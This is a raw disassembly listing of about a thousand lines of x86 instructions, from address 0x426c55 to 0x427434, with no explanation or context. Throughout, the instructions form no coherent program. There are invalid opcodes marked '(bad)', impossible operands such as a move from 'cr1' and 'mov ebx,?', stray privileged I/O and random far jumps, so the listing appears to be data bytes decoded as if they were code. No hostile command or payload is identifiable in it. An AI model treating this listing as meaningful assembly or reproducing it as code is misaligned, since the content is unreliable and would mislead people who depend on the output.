  426c55:	mov    edx,cr1
  426c58:	popa   
  426c59:	or     bl,BYTE PTR ds:0x46f163f3
  426c5f:	nop
  426c60:	jb     0x426cc1
  426c62:	sbb    BYTE PTR [edx-0xa09f61e],0xb7
  426c69:	ror    dl,1
  426c6b:	pop    edx
  426c6c:	sub    al,0xa4
  426c6e:	fld    st(1)
  426c70:	imul   esp,DWORD PTR [ebp+0x50cf4559],0x23
  426c77:	mov    dh,0x7d
  426c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c7a:	call   0xb2cd:0xef42b58b
  426c81:	popf   
  426c82:	and    cl,BYTE PTR [esi+0x14bcbff3]
  426c88:	pop    esp
  426c89:	mov    eax,ds:0x43842726
  426c8e:	mov    ss,ecx
  426c90:	mov    fs:0x366c4844,eax
  426c96:	pop    es
  426c97:	jo     0x426cfc
  426c99:	adc    BYTE PTR [edx+eax*1-0x3a898a78],0x33
  426ca1:	jb     0x426cbc
  426ca3:	enter  0x1b51,0x39
  426ca7:	jp     0x426c93
  426ca9:	dec    esp
  426caa:	add    cl,ah
  426cac:	mov    ch,0x6f
  426cae:	mov    edx,0xa9bf209b
  426cb3:	test   eax,0x780d2664
  426cb8:	test   BYTE PTR [eax-0x14dcc9d4],dh
  426cbe:	mov    dl,0x27
  426cc0:	sbb    al,0xe2
  426cc2:	xor    BYTE PTR [ebp-0x3c],ch
  426cc5:	in     al,dx
  426cc6:	xchg   ebx,ebx
  426cc8:	ficomp DWORD PTR [eax+edx*4+0x72]
  426ccc:	ins    BYTE PTR es:[edi],dx
  426ccd:	push   ecx
  426cce:	inc    ebx
  426ccf:	scas   al,BYTE PTR es:[edi]
  426cd0:	adc    BYTE PTR [ebp+ebx*2+0x66],ch
  426cd4:	fldcw  WORD PTR [ebx-0x35]
  426cd7:	xor    al,0x35
  426cd9:	fs mov ah,0x28
  426cdc:	push   ss
  426cdd:	sti    
  426cde:	pop    ecx
  426cdf:	adc    eax,0x3275ff29
  426ce4:	js     0x426cee
  426ce6:	es mov al,0x14
  426ce9:	scas   al,BYTE PTR es:[edi]
  426cea:	imul   ecx,DWORD PTR [eax-0x670afe08],0x4658dbf0
  426cf4:	xchg   ecx,eax
  426cf5:	cmp    al,0x5a
  426cf7:	data16 jae 0x426d61
  426cfa:	pop    esi
  426cfb:	ins    DWORD PTR es:[edi],dx
  426cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cfd:	loopne 0x426d22
  426cff:	mov    esp,0x2e9e6182
  426d04:	inc    ecx
  426d05:	enter  0x3d71,0x5e
  426d09:	fmul   QWORD PTR cs:[eax-0x7e]
  426d0d:	pop    edi
  426d0e:	mov    edi,0x3e5543d7
  426d13:	dec    esi
  426d14:	rcr    DWORD PTR [eax+0x6c],0xee
  426d18:	push   esp
  426d19:	test   BYTE PTR [ebx-0x5],dh
  426d1c:	pop    esp
  426d1d:	xchg   BYTE PTR [eax-0x30],bh
  426d20:	sbb    al,0x23
  426d22:	adc    edx,0xffffffa4
  426d25:	sahf   
  426d26:	mov    ah,0x82
  426d28:	xchg   esi,eax
  426d29:	pop    ds
  426d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d2b:	and    DWORD PTR [ecx-0x240c478d],eax
  426d31:	mov    DWORD PTR ds:0x64ef2a15,edi
  426d37:	repnz fwait
  426d39:	cld    
  426d3a:	je     0x426d24
  426d3c:	sub    BYTE PTR [esi+edi*2],0x6e
  426d40:	mov    ebp,0x3fb9874f
  426d45:	jns    0x426d47
  426d47:	xchg   esp,eax
  426d48:	(bad)  
  426d49:	or     eax,0xa2d057a1
  426d4e:	lahf   
  426d4f:	fimul  WORD PTR [eax+0x6e]
  426d52:	jnp    0x426d51
  426d54:	inc    edi
  426d55:	push   es
  426d56:	dec    edx
  426d57:	push   ss
  426d58:	jae    0x426db5
  426d5a:	(bad)  [edi+0x9df87af]
  426d60:	mov    cl,0x5d
  426d62:	data16 ror BYTE PTR [esp+eiz*8-0x31],1
  426d67:	mov    BYTE PTR [esi+0x3d1a1d32],ch
  426d6d:	in     eax,0xcf
  426d6f:	add    DWORD PTR [edi],esp
  426d71:	in     al,dx
  426d72:	lahf   
  426d73:	scas   eax,DWORD PTR es:[edi]
  426d74:	repz fild QWORD PTR [edi-0x43455878]
  426d7b:	pop    edx
  426d7c:	jo     0x426d6f
  426d7e:	enter  0xa6b5,0xdb
  426d82:	mov    esp,0xc985a5a7
  426d87:	mov    edi,gs
  426d89:	xlat   BYTE PTR ds:[ebx]
  426d8a:	inc    esi
  426d8b:	cmc    
  426d8c:	add    al,0x69
  426d8e:	pop    ebx
  426d8f:	in     al,0x5d
  426d91:	test   BYTE PTR [eax+0xe],ch
  426d94:	adc    cl,BYTE PTR [esi]
  426d96:	mov    al,0xd1
  426d98:	push   esp
  426d99:	xchg   esi,eax
  426d9a:	mov    edx,0x85e2275d
  426d9f:	adc    al,0x49
  426da1:	fldenv [esi]
  426da3:	shl    DWORD PTR [eax+esi*2-0x1b],0xf8
  426da8:	mov    dh,BYTE PTR ds:0xf35fbc3e
  426dae:	sub    eax,esi
  426db0:	dec    ecx
  426db1:	popf   
  426db2:	iret   
  426db3:	(bad)  
  426db4:	dec    BYTE PTR [ecx]
  426db6:	cmp    al,0x75
  426db8:	mov    edx,0xd90537c6
  426dbd:	sar    BYTE PTR [ecx-0x78457d6c],1
  426dc3:	xor    al,0x71
  426dc5:	add    al,0x9a
  426dc7:	sbb    edx,DWORD PTR [eax+0x5a]
  426dca:	xor    cl,BYTE PTR [eax+0x5f]
  426dcd:	cmp    edx,DWORD PTR [ebp+0x57]
  426dd0:	push   eax
  426dd1:	outs   dx,DWORD PTR ds:[esi]
  426dd2:	rcr    DWORD PTR [eax+0x30],cl
  426dd5:	xchg   esi,eax
  426dd6:	jmp    0x426deb
  426dd8:	xchg   edi,eax
  426dd9:	inc    eax
  426dda:	mov    WORD PTR [eax+0x4c],cs
  426ddd:	xchg   ebp,eax
  426dde:	ins    DWORD PTR es:[edi],dx
  426ddf:	push   ebp
  426de0:	jp     0x426dd1
  426de2:	add    eax,0x5df2a6
  426de7:	sub    DWORD PTR [ecx-0x4e7acaa5],edi
  426ded:	cs add eax,0xf17cdbd1
  426df3:	inc    ebp
  426df4:	dec    edi
  426df5:	sub    BYTE PTR [ebx-0x3f],dl
  426df8:	cwde   
  426df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426dfa:	sub    esp,DWORD PTR [eax+edx*8]
  426dfd:	bound  edx,QWORD PTR ds:0x34314270
  426e03:	push   esp
  426e04:	in     eax,dx
  426e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e06:	fstp   TBYTE PTR [ebx+0x2bda6d58]
  426e0c:	mov    ds:0xbcea,eax
	...
  426e19:	add    BYTE PTR [esi-0x28ab281c],dh
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	sub    edx,DWORD PTR [edi+0x71]
  426e29:	sbb    eax,0x1e475
  426e2e:	std    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [ecx+0x768845ec],ch
  426e37:	cmp    BYTE PTR [eax-0x17],bh
  426e3a:	xchg   edx,eax
  426e3b:	in     eax,0x4b
  426e3d:	in     al,dx
  426e3e:	mov    ch,0x9d
  426e40:	mov    ah,0x19
  426e42:	mov    ah,0xed
  426e44:	xchg   esi,eax
  426e45:	out    dx,eax
  426e46:	stc    
  426e47:	inc    ecx
  426e48:	inc    ebx
  426e49:	fist   WORD PTR [esi-0x1]
  426e4c:	add    dh,BYTE PTR [edx]
  426e4e:	popa   
  426e4f:	add    BYTE PTR [edi-0x69e69de5],ch
  426e55:	cmp    edi,esi
  426e57:	or     cl,BYTE PTR [ebx+edi*2]
  426e5a:	jno    0x426ea0
  426e5c:	iret   
  426e5d:	mov    cl,0xe0
  426e5f:	mov    ch,0xe9
  426e61:	in     eax,dx
  426e62:	lock jl 0x426eb0
  426e65:	in     eax,dx
  426e66:	inc    ebp
  426e67:	add    BYTE PTR ds:0x4e9fab57,ch
  426e6d:	cmc    
  426e6e:	adc    al,BYTE PTR [eax+ecx*1]
  426e71:	out    0x84,al
  426e73:	cmp    BYTE PTR [eax-0x5],al
  426e76:	lods   al,BYTE PTR ds:[esi]
  426e77:	pop    edx
  426e78:	push   es
  426e79:	(bad)  
  426e7a:	jns    0x426ee7
  426e7c:	es jecxz 0x426e1c
  426e7f:	xchg   esp,eax
  426e80:	std    
  426e81:	lods   eax,DWORD PTR ds:[esi]
  426e82:	add    DWORD PTR es:[ecx+0xd480e6],ecx
  426e89:	jne    0x426e83
  426e8b:	push   0xffffffc7
  426e8d:	xchg   ecx,eax
  426e8e:	or     ebp,DWORD PTR [ebp-0x5b]
  426e91:	sub    DWORD PTR [ebx+0x5],ebx
  426e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e95:	lock sbb al,0xc0
  426e98:	addr16 mov edx,0x5ee573c0
  426e9e:	mov    edx,0x676965ce
  426ea3:	add    bl,ah
  426ea5:	pop    es
  426ea6:	int    0x58
  426ea8:	popa   
  426ea9:	and    bh,BYTE PTR [edi+0x1b25a379]
  426eaf:	data16 cmp BYTE PTR [edi+0x29],0x97
  426eb4:	xchg   ebp,eax
  426eb5:	into   
  426eb6:	push   ecx
  426eb7:	dec    esi
  426eb8:	pop    ss
  426eb9:	sub    edi,DWORD PTR [bp+si-0x6a0a]
  426ebe:	jno    0x426ef2
  426ec0:	inc    ebx
  426ec1:	pop    esi
  426ec2:	imul   DWORD PTR [edi]
  426ec4:	mov    al,ds:0xf99739db
  426ec9:	push   ss
  426eca:	lods   al,BYTE PTR ds:[esi]
  426ecb:	sbb    eax,0x47bc2650
  426ed0:	and    dl,bh
  426ed2:	cs sub al,0xbb
  426ed5:	mov    dl,0xbe
  426ed7:	retf   0xe79c
  426eda:	jae    0x426ef3
  426edc:	fstp   DWORD PTR [edx]
  426ede:	outs   dx,DWORD PTR ds:[esi]
  426edf:	add    eax,0x1dabb0dd
  426ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ee5:	sti    
  426ee6:	xchg   edi,esi
  426ee8:	xor    al,0xe3
  426eea:	jmp    0x640e8cd1
  426eef:	xchg   esp,eax
  426ef0:	imul   edi,DWORD PTR [ebp+eax*8+0xc832ab4],0x6de794ff
  426efb:	push   esi
  426efc:	dec    ecx
  426efd:	mov    al,0x39
  426eff:	cli    
  426f00:	icebp  
  426f01:	(bad)  
  426f02:	ror    dl,cl
  426f04:	aad    0x55
  426f06:	outs   dx,BYTE PTR ds:[esi]
  426f07:	sbb    bl,ch
  426f09:	pop    ebp
  426f0a:	mov    dh,0xfe
  426f0c:	pop    edx
  426f0d:	xchg   BYTE PTR [ecx],ch
  426f0f:	js     0x426f17
  426f11:	jmp    0x337735f2
  426f16:	out    dx,eax
  426f17:	dec    eax
  426f18:	mov    DWORD PTR [ebx],ecx
  426f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f1b:	push   es
  426f1c:	bound  edx,QWORD PTR [ebp+0x52]
  426f1f:	jae    0x426f3f
  426f21:	pop    esi
  426f22:	cmp    eax,0x9a93c82a
  426f27:	mov    edi,0x5c9ab4e1
  426f2c:	dec    ebp
  426f2d:	je     0x426fa3
  426f2f:	in     eax,dx
  426f30:	ror    DWORD PTR [esi+ecx*4],0x20
  426f34:	pop    es
  426f35:	mov    bl,0x7f
  426f37:	push   es
  426f38:	add    DWORD PTR [ebx],ebx
  426f3a:	retf   0x8a40
  426f3d:	push   cs
  426f3e:	mov    al,0xb5
  426f40:	adc    esp,edx
  426f42:	push   esp
  426f43:	jle    0x426fa7
  426f45:	mov    ch,cl
  426f47:	xchg   edi,eax
  426f48:	(bad)  
  426f49:	xor    bl,BYTE PTR [eax-0x1f]
  426f4c:	mov    ebx,0xdf1618ac
  426f51:	pop    ss
  426f52:	rcl    BYTE PTR [esi+eiz*8],0x9b
  426f56:	adc    BYTE PTR [ebp-0x29],bh
  426f59:	push   ds
  426f5a:	xlat   BYTE PTR gs:[ebx]
  426f5c:	fwait
  426f5d:	pop    ss
  426f5e:	lods   eax,DWORD PTR ds:[esi]
  426f5f:	test   al,0x5a
  426f61:	and    eax,0x890f98ed
  426f66:	(bad)  
  426f67:	mov    ecx,0xb9fc94a8
  426f6c:	cmp    ecx,DWORD PTR [esi+0x58b6e97f]
  426f72:	add    ecx,DWORD PTR [ebx]
  426f74:	adc    bl,cl
  426f76:	and    bh,dh
  426f78:	mov    edi,0x8480292d
  426f7d:	sub    ecx,DWORD PTR [edi+0x1f]
  426f80:	cli    
  426f81:	test   eax,0x85365a17
  426f86:	mov    cl,0x75
  426f88:	adc    esp,0xb30a1284
  426f8e:	mov    esi,0x237b5d47
  426f93:	ss inc edx
  426f95:	xor    eax,0xa3ea28db
  426f9a:	fidivr DWORD PTR [ecx+0x6a]
  426f9d:	cld    
  426f9e:	mov    ds:0xef9e12f5,al
  426fa3:	xchg   DWORD PTR [esi],edx
  426fa5:	mov    edx,0xd64b044b
  426faa:	jmp    0x426f41
  426fac:	dec    ebp
  426fad:	push   es
  426fae:	inc    ebx
  426faf:	mov    esi,0x4914a4af
  426fb4:	ret    0x6173
  426fb7:	int    0x2
  426fb9:	push   edi
  426fba:	shr    BYTE PTR [ebp+0x2c],cl
  426fbd:	mov    ah,0xd
  426fbf:	and    BYTE PTR [edx],dh
  426fc1:	cli    
  426fc2:	or     BYTE PTR [edx+ebx*2],bl
  426fc5:	sub    al,0x76
  426fc7:	jo     0x426fcb
  426fc9:	jno    0x426f5e
  426fcb:	shr    edx,cl
  426fcd:	cs icebp 
  426fcf:	mov    ecx,0xaf09fb7c
  426fd4:	call   0x99d8:0x4c403aa1
  426fdb:	mov    al,BYTE PTR [ebx]
  426fdd:	loopne 0x427052
  426fdf:	sub    bl,ah
  426fe1:	or     al,0x8e
  426fe3:	cmp    BYTE PTR [ecx+0x40],ch
  426fe6:	pop    esp
  426fe7:	mov    al,0x4c
  426fe9:	fld    DWORD PTR [ebx+0x3ab62220]
  426fef:	dec    edi
  426ff0:	cmp    cl,BYTE PTR [edi]
  426ff2:	push   es
  426ff3:	and    BYTE PTR [edx+0x1],bl
  426ff6:	out    0x3e,al
  426ff8:	sub    ebp,eax
  426ffa:	les    esp,FWORD PTR [eax]
  426ffc:	adc    dh,dl
  426ffe:	loopne 0x426fe4
  427000:	gs call 0x45de:0xef50eeac
  427008:	mov    ecx,DWORD PTR [eax+0x72]
  42700b:	loope  0x42706a
  42700d:	(bad)  
  42700e:	fst    QWORD PTR [ecx+0x1e8e14e]
  427014:	clc    
  427015:	mov    ds:0xc8828479,eax
  42701a:	pop    esi
  42701b:	and    BYTE PTR [edi-0x2fc476c7],0x80
  427022:	daa    
  427023:	aaa    
  427024:	sub    ebp,edi
  427026:	xor    ebx,DWORD PTR [esi]
  427028:	xchg   esp,eax
  427029:	inc    ebp
  42702a:	adc    edx,DWORD PTR [ebp+0x3dd17f]
	...
  427038:	add    BYTE PTR [eax],al
  42703a:	cli    
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x85bc2eb]
  427047:	popf   
  427048:	add    eax,0x1e6727d
  42704d:	add    ch,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR ds:0x83b4c960,ch
  427057:	xor    ch,0x7c
  42705a:	aam    0xb6
  42705c:	pminsw mm5,QWORD PTR [ebp-0x45fdbdfd]
  427063:	xor    eax,0xd23b28f8
  427068:	dec    ebp
  427069:	outs   dx,DWORD PTR ds:[esi]
  42706a:	fdivp  st(1),st
  42706c:	mov    edi,DWORD PTR [esi-0x726e2217]
  427072:	and    eax,DWORD PTR [eax]
  427074:	inc    edx
  427075:	mov    BYTE PTR [edi+0x123ea78e],dh
  42707b:	push   edx
  42707c:	loop   0x427095
  42707e:	mov    edx,0x72474b25
  427083:	or     ecx,ebp
  427085:	mov    ds,ebp
  427087:	or     DWORD PTR [edi-0x72ceb781],eax
  42708d:	xlat   BYTE PTR ds:[ebx]
  42708e:	(bad)  
  42708f:	mov    al,bl
  427091:	ret    
  427092:	lahf   
  427093:	push   0x6d248bd1
  427098:	and    al,0x12
  42709a:	ds aad 0x26
  42709d:	mov    ds:0xb8e8bf97,al
  4270a2:	inc    eax
  4270a3:	std    
  4270a4:	in     eax,dx
  4270a5:	(bad)  
  4270a6:	sub    DWORD PTR [edi+0x39eb532f],ecx
  4270ac:	ss add al,0xbf
  4270af:	fs pusha 
  4270b1:	sbb    DWORD PTR [esi-0x65864c60],ebx
  4270b7:	sub    DWORD PTR [esp],ecx
  4270ba:	xor    ebx,DWORD PTR [ecx+0x65]
  4270bd:	int    0x19
  4270bf:	and    al,0x91
  4270c1:	test   al,0xe2
  4270c3:	mov    edi,0xdb16b095
  4270c8:	arpl   dx,si
  4270ca:	sbb    eax,DWORD PTR [eax+0x1be5fa48]
  4270d0:	rcr    ecx,cl
  4270d2:	push   ss
  4270d3:	mov    al,0x41
  4270d5:	pushf  
  4270d6:	jne    0x4270de
  4270d8:	out    dx,al
  4270d9:	jmp    0xc242e213
  4270de:	jl     0x42709e
  4270e0:	aam    0x6
  4270e2:	stos   DWORD PTR es:[edi],eax
  4270e3:	mov    ebx,DWORD PTR [esi+0x33]
  4270e6:	xchg   ecx,eax
  4270e7:	mov    ebp,0x9489ec60
  4270ec:	xor    ah,ah
  4270ee:	jae    0x4270ea
  4270f0:	(bad)  
  4270f1:	in     al,dx
  4270f2:	mov    ds:0xefd999d4,eax
  4270f7:	or     ecx,DWORD PTR [ecx-0x13fa4076]
  4270fd:	inc    eax
  4270fe:	cmp    DWORD PTR [eax-0x138c6d23],eax
  427104:	js     0x4270a5
  427106:	adc    eax,0x267a458c
  42710b:	pop    es
  42710c:	clc    
  42710d:	enter  0x3dea,0x4d
  427111:	iret   
  427112:	rcr    BYTE PTR [ebp+0x7a93187b],0xf2
  427119:	(bad)  
  42711a:	lods   eax,DWORD PTR ds:[esi]
  42711b:	jmp    0xb295:0x10a6f871
  427122:	out    dx,al
  427123:	mov    cs,WORD PTR [ecx+0x26e0e702]
  427129:	or     cl,BYTE PTR ds:0x39071175
  42712f:	adc    edi,DWORD PTR [eax-0x124878df]
  427135:	rcr    DWORD PTR [edi+0x17],cl
  427138:	sti    
  427139:	leave  
  42713a:	mov    dl,0x87
  42713c:	shr    eax,1
  42713e:	or     ah,cl
  427140:	sbb    DWORD PTR [eax-0x22],esp
  427143:	mov    ebx,?
  427145:	adc    edx,DWORD PTR [ebp+0x5bd3f21d]
  42714b:	lods   al,BYTE PTR ds:[esi]
  42714c:	aad    0xaa
  42714e:	add    al,BYTE PTR [eax]
  427150:	mov    eax,ds:0xadea400b
  427155:	repnz cmp al,0xf1
  427158:	add    al,0xbb
  42715a:	popf   
  42715b:	or     DWORD PTR [ebx+0x3170b8e4],0x67fa8eb8
  427165:	icebp  
  427166:	rol    DWORD PTR [esi-0x57aef54a],1
  42716c:	pop    edx
  42716d:	cld    
  42716e:	pop    esi
  42716f:	iret   
  427170:	mov    dl,0x32
  427172:	data16 das 
  427174:	shl    BYTE PTR [ecx+0x669c6823],1
  42717a:	inc    ebx
  42717b:	leave  
  42717c:	adc    DWORD PTR [edx-0x3],ebp
  42717f:	xchg   ebx,eax
  427180:	sbb    esi,0xff92465f
  427186:	dec    edi
  427187:	ror    BYTE PTR [esp+eax*4],cl
  42718a:	in     al,dx
  42718b:	or     esi,edx
  42718d:	sbb    cl,bh
  42718f:	add    BYTE PTR [ebx-0x2ea1e080],al
  427195:	jmp    0x42719e
  427197:	xor    edx,DWORD PTR [ebp+ebp*4-0x5a]
  42719b:	(bad)  
  42719c:	daa    
  42719d:	repnz gs call 0x9cb0:0x38d9cf95
  4271a6:	dec    edx
  4271a7:	fs stos DWORD PTR es:[edi],eax
  4271a9:	stos   DWORD PTR es:[edi],eax
  4271aa:	push   es
  4271ab:	mov    al,ds:0x119a9f91
  4271b0:	inc    esi
  4271b1:	sbb    ch,BYTE PTR [ebp+ecx*2-0x323d4de3]
  4271b8:	clc    
  4271b9:	out    0xe4,eax
  4271bb:	outs   dx,BYTE PTR ds:[esi]
  4271bc:	xchg   ecx,eax
  4271bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271be:	inc    ebx
  4271bf:	in     eax,0xb8
  4271c1:	cmp    al,BYTE PTR [edx-0x4c71d6d5]
  4271c7:	(bad)  
  4271c8:	fmul   QWORD PTR [edi]
  4271ca:	loope  0x4271c1
  4271cc:	popa   
  4271cd:	jbe    0x427177
  4271cf:	enter  0x76fa,0x64
  4271d3:	lods   al,BYTE PTR ds:[esi]
  4271d4:	fwait
  4271d5:	ret    
  4271d6:	sub    al,0x91
  4271d8:	xor    eax,0x5710108d
  4271dd:	mov    edx,0x42050065
  4271e2:	jle    0x427226
  4271e4:	xchg   DWORD PTR [edx],edx
  4271e6:	push   0x73df50de
  4271eb:	mul    DWORD PTR [edi]
  4271ed:	sub    al,0x36
  4271ef:	lahf   
  4271f0:	leave  
  4271f1:	jbe    0x427264
  4271f3:	pop    eax
  4271f4:	cmp    edi,DWORD PTR [ebp-0x1f]
  4271f7:	push   edi
  4271f8:	xlat   BYTE PTR ds:[ebx]
  4271f9:	in     eax,dx
  4271fa:	aas    
  4271fb:	lea    eax,[edi-0x5d]
  4271fe:	sbb    ah,BYTE PTR [ecx+0x1]
  427201:	sbb    eax,0xb6e5ad98
  427206:	jns    0x427275
  427208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427209:	hlt    
  42720a:	and    ebp,esp
  42720c:	xor    al,0x56
  42720e:	inc    edi
  42720f:	les    ebp,FWORD PTR [edi-0x149d437e]
  427215:	inc    esi
  427216:	call   0x6d5a1e89
  42721b:	adc    DWORD PTR ds:[edx+0x58],esi
  42721f:	add    eax,0xda383d05
  427224:	push   0xffffff8c
  427226:	outs   dx,DWORD PTR ds:[esi]
  427227:	xchg   edx,eax
  427228:	ret    
  427229:	mov    bl,0x9e
  42722b:	clc    
  42722c:	dec    ebp
  42722d:	int3   
  42722e:	dec    esp
  42722f:	dec    edx
  427230:	xchg   ecx,eax
  427231:	in     al,dx
  427232:	mov    bl,0x58
  427234:	out    dx,eax
  427235:	repz cmp ebp,DWORD PTR [edx]
  427238:	and    ebp,DWORD PTR [edx+ecx*1]
  42723b:	arpl   WORD PTR ds:[eax+0xd],di
  42723f:	aam    0xab
  427241:	and    bh,BYTE PTR [ecx+0x260a91bc]
  427247:	movlps xmm3,QWORD PTR [eax-0x3983a450]
  42724e:	jo     0x427250
	...
  427258:	add    BYTE PTR [eax],al
  42725a:	iret   
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0xc5b02077
  427267:	mov    ebp,0xe86f2b59
  42726c:	add    DWORD PTR [eax],eax
  42726e:	std    
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    BYTE PTR ds:0xbeb6201d,bh
  427277:	xchg   ebx,eax
  427278:	dec    ebp
  427279:	pop    eax
  42727a:	pop    eax
  42727b:	pop    ebp
  42727c:	mov    eax,ds:0x8d2a0b6b
  427281:	fist   DWORD PTR [esi+ebx*1+0x5177ac45]
  427288:	push   0xcc4f2b7f
  42728d:	imul   esi
  42728f:	fild   QWORD PTR [ecx+0x12606488]
  427295:	mov    al,ds:0x5b07cace
  42729a:	pusha  
  42729b:	inc    ecx
  42729c:	adc    BYTE PTR ds:0x298b80f1,dh
  4272a2:	pop    ebx
  4272a3:	jns    0x427308
  4272a5:	xchg   BYTE PTR [ebx+edi*8],bh
  4272a8:	mov    edi,0xad6162b3
  4272ad:	xchg   bl,ch
  4272af:	xchg   edx,eax
  4272b0:	test   DWORD PTR [edx+eax*4-0x44],esi
  4272b4:	jmp    0x427256
  4272b6:	mov    ebp,0xce325649
  4272bb:	or     BYTE PTR [ebp+0x4b],0x70
  4272bf:	mov    eax,ds:0x507dc19d
  4272c4:	jmp    0xa5c1:0x28a2cd68
  4272cb:	in     al,0xd0
  4272cd:	aad    0xb5
  4272cf:	push   edx
  4272d0:	(bad)  
  4272d1:	cld    
  4272d2:	(bad)  
  4272d3:	fldenv [edx-0x56]
  4272d6:	add    bh,bl
  4272d8:	lds    ebp,FWORD PTR [esi-0x2b]
  4272db:	pop    edx
  4272dc:	cmp    ebp,ebp
  4272de:	push   0x3717e3ad
  4272e3:	(bad)  
  4272e4:	jecxz  0x42727d
  4272e6:	scas   al,BYTE PTR es:[edi]
  4272e7:	setl   BYTE PTR [eax-0x7f]
  4272eb:	pop    edx
  4272ec:	mov    edi,0x3a245639
  4272f1:	dec    edi
  4272f2:	dec    ecx
  4272f3:	loop   0x4272f4
  4272f5:	jg     0x42733f
  4272f7:	rcr    DWORD PTR [ecx-0x77],cl
  4272fa:	in     al,dx
  4272fb:	push   es
  4272fc:	xchg   ah,dl
  4272fe:	(bad)  
  4272ff:	mov    ah,BYTE PTR [ebx]
  427301:	cmp    esi,ebx
  427303:	cmc    
  427304:	or     ecx,edx
  427306:	mov    ebp,eax
  427308:	loopne 0x427347
  42730a:	cmp    DWORD PTR [eax+0x52],eax
  42730d:	push   ebx
  42730e:	sub    DWORD PTR [ecx],ebx
  427310:	sub    ecx,DWORD PTR [edi-0x702bf48d]
  427316:	push   ds
  427317:	fdivr  st,st(7)
  427319:	repnz lods al,BYTE PTR ds:[esi]
  42731b:	shr    BYTE PTR [eax+edx*2+0x76],1
  42731f:	ret    0xdf1c
  427322:	xor    ebp,DWORD PTR [ecx+0x35]
  427325:	ja     0x4272f1
  427327:	jmp    0xdf17:0x9f950b6
  42732e:	jmp    0x4272cf
  427330:	xchg   edi,eax
  427331:	call   0x4d8b:0xd91a9853
  427338:	outs   dx,BYTE PTR ds:[esi]
  427339:	jae    0x427309
  42733b:	sbb    esp,ebp
  42733d:	arpl   ax,ax
  42733f:	push   0x26386548
  427344:	add    ah,cl
  427346:	aam    0x56
  427348:	dec    ecx
  427349:	xchg   ebx,eax
  42734a:	sahf   
  42734b:	push   edi
  42734c:	retf   0xf939
  42734f:	retf   0xbb94
  427352:	mov    BYTE PTR [esi],0x26
  427355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427356:	pop    edx
  427357:	mov    esi,ebx
  427359:	inc    eax
  42735a:	(bad)  
  42735b:	lock fldcw WORD PTR [esi+eax*1]
  42735f:	push   esi
  427360:	loope  0x427352
  427362:	add    DWORD PTR [edi-0x36],ebx
  427365:	xor    bh,ah
  427367:	xchg   esp,eax
  427368:	inc    esp
  427369:	cmp    edx,DWORD PTR [ebx+ebx*4-0x82ae173]
  427370:	imul   ecx,DWORD PTR [ecx+ebx*1+0x5],0xc83513a1
  427378:	adc    edx,DWORD PTR [ecx]
  42737a:	mov    ds:0x9f7c6a0c,eax
  42737f:	lods   eax,DWORD PTR ds:[esi]
  427380:	adc    eax,0xdff2b543
  427385:	dec    edi
  427386:	pop    ecx
  427387:	scas   eax,DWORD PTR es:[edi]
  427388:	cmp    eax,0x762b838c
  42738d:	fisub  WORD PTR [edi-0x59]
  427390:	ret    
  427391:	dec    ebx
  427392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427393:	mov    esi,0x7a479a86
  427398:	not    bh
  42739a:	adc    dh,BYTE PTR [esi]
  42739c:	sbb    DWORD PTR [ebx],0xffffff8f
  42739f:	dec    edx
  4273a0:	shl    ecx,0x56
  4273a3:	retf   0x3ac6
  4273a6:	mov    bl,0x8e
  4273a8:	mov    dl,0x93
  4273aa:	jbe    0x427426
  4273ac:	jmp    0x2266a17e
  4273b1:	fs push es
  4273b3:	out    0x99,al
  4273b5:	mov    eax,0x5dafec17
  4273ba:	int3   
  4273bb:	push   edx
  4273bc:	sbb    al,0xf4
  4273be:	lahf   
  4273bf:	int3   
  4273c0:	in     al,dx
  4273c1:	aas    
  4273c2:	ja     0x4273e4
  4273c4:	push   ds
  4273c5:	out    0x9d,eax
  4273c7:	and    ebp,DWORD PTR [esi]
  4273c9:	mov    edi,0xb2b0dafe
  4273ce:	sbb    eax,0xd32753e7
  4273d3:	pop    ebx
  4273d4:	les    edi,FWORD PTR [esi+0x7a]
  4273d7:	cmp    dl,BYTE PTR [edx-0x79]
  4273da:	call   FWORD PTR [edx-0x7b]
  4273dd:	fwait
  4273de:	ret    
  4273df:	mov    esp,0x22ff7663
  4273e4:	xchg   esp,eax
  4273e5:	jle    0x42740e
  4273e7:	jmp    0xeec6:0x2e2c11a9
  4273ee:	aas    
  4273ef:	retf   
  4273f0:	cmc    
  4273f1:	mov    ebx,0xeca7ed3a
  4273f6:	jl     0x42745a
  4273f8:	dec    edx
  4273f9:	sbb    eax,0xef8ca508
  4273fe:	das    
  4273ff:	mov    esp,0xc1649626
  427404:	dec    esp
  427405:	js     0x4273bd
  427407:	(bad)  
  427408:	loopne 0x427425
  42740a:	xor    BYTE PTR [ebp+0x5],bl
  42740d:	dec    ebp
  42740e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42740f:	out    0x61,al
  427411:	jns    0x427422
  427413:	jl     0x4273b2
  427415:	push   edx
  427416:	mov    bl,0xf3
  427418:	push   esp
  427419:	push   ds
  42741a:	cld    
  42741b:	mov    dh,0x7d
  42741d:	jb     0x4273e2
  42741f:	je     0x42744b
  427421:	jo     0x4273e7
  427423:	jae    0x42749f
  427425:	xor    al,0xdf
  427427:	cmp    DWORD PTR [ebx+0x254e82e],ebx
  42742d:	mov    ebp,0xa61dfa8a
  427432:	pop    edx
  427433:	inc    esi
  427434:	popf   
